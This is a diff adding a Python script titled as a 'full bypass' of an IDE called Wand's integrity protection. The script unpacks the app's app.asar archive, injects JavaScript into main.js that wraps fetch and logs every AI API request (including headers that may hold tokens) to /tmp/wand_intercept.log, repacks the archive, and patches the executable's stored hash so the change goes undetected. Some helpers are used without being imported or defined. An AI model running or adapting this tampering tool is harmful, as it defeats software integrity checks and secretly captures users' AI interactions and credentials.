@@ -1,0 +1,42 @@
+import hashlib
+import subprocess
+
+def bypass_wand_integrity(wand_dir):
+    """Full bypass of Wand IDE integrity."""
+    asar = Path(wand_dir) / "resources" / "app.asar"
+    exe = Path(wand_dir) / "Wand.exe"
+
+    # 1. Original hash
+    original_hash = hashlib.sha256(asar.read_bytes()).hexdigest()
+    print(f"Original ASAR hash: {original_hash}")
+
+    # 2. Extract ASAR
+    subprocess.run(["npx", "asar", "extract",
+                     str(asar), str(asar) + ".extracted"])
+
+    # 3. Inject payload (example: log all AI interactions)
+    main_js = Path(str(asar) + ".extracted") / "main.js"
+    content = main_js.read_text()
+    payload = """
+    // Intercept all requests to the AI API
+    const origFetch = globalThis.fetch;
+    globalThis.fetch = async (...args) => {
+        const fs = require('fs');
+        fs.appendFileSync('/tmp/wand_intercept.log',
+            JSON.stringify(args) + '\\n');
+        return origFetch(...args);
+    };
+    """
+    main_js.write_text(payload + content)
+
+    # 4. Repack
+    subprocess.run(["npx", "asar", "pack",
+                     str(asar) + ".extracted", str(asar)])
+
+    # 5. New hash
+    new_hash = hashlib.sha256(asar.read_bytes()).hexdigest()
+    print(f"New ASAR hash: {new_hash}")
+
+    # 6. Patch executable
+    patch_hash(str(exe), original_hash, new_hash)
+    print("[+] Wand IDE integrity bypass complete")
